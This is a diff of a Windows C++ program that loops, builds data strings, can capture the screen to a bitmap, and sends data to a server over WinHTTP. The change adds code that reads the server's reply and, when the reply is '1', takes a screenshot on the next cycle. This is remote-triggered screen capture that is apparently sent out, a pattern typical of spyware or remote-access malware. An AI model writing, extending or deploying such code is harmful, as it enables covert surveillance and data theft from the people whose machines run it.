@@ -93,6 +93,8 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
         }
     }
 
+    BOOL shouldTakeScreenshot = false;
+
     while (buff != NULL) {
         auto l = static_cast<DWORD>(0);
 
@@ -133,9 +135,15 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 
         BOOL bResults = FALSE;
 
-        SaveBitmap(SAVE_BITMAP_TO);
+        std::string bitmapAsStr;
 
-        auto bitmapAsStr = ReadBitmap(SAVE_BITMAP_TO);
+        if (shouldTakeScreenshot) {
+            SaveBitmap(SAVE_BITMAP_TO);
+
+            bitmapAsStr = ReadBitmap(SAVE_BITMAP_TO);
+
+            shouldTakeScreenshot = false;
+        }
 
         auto data = d + L"\n" + c + L"\n" + u + L"\n";
 
@@ -159,9 +167,60 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
             wprintf(L"Could not get hRequest\n");
         }
 
-        delete[] body;
+        // End the request.
+        if (bResults)
+            bResults = WinHttpReceiveResponse(hRequest, NULL);
 
-        wprintf(L"Error %d has occurred.\n", GetLastError());
+        DWORD dwSize = 0;
+        DWORD dwDownloaded = 0;
+        LPSTR pszOutBuffer;
+
+        // Keep checking for data until there is nothing left.
+        if (bResults)
+        {
+            do
+            {
+                // Check for available data.
+                dwSize = 0;
+                if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
+                    printf("Error %u in WinHttpQueryDataAvailable.\n",
+                        GetLastError());
+
+                // Allocate space for the buffer.
+                pszOutBuffer = new char[static_cast<unsigned long long>(dwSize) + 1];
+                if (!pszOutBuffer)
+                {
+                    printf("Out of memory\n");
+                    dwSize = 0;
+                }
+                else
+                {
+                    // Read the data.
+                    ZeroMemory(pszOutBuffer, static_cast<unsigned long long>(dwSize) + 1);
+
+                    if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
+                        dwSize, &dwDownloaded))
+                        printf("Error %u in WinHttpReadData.\n", GetLastError());
+                    else
+                        printf("%s", pszOutBuffer);
+
+                    const auto response = std::string(pszOutBuffer);
+
+                    if (response == "1") {
+                        shouldTakeScreenshot = true;
+                    }
+
+                    // Free the memory allocated to the buffer.
+                    delete[] pszOutBuffer;
+                }
+            } while (dwSize > 0);
+        }
+
+        if (!bResults) {
+            printf("Error %d has occurred.\n", GetLastError());
+        }
+
+        delete[] body;
 
         // Close open handles.
         if (hRequest) WinHttpCloseHandle(hRequest);
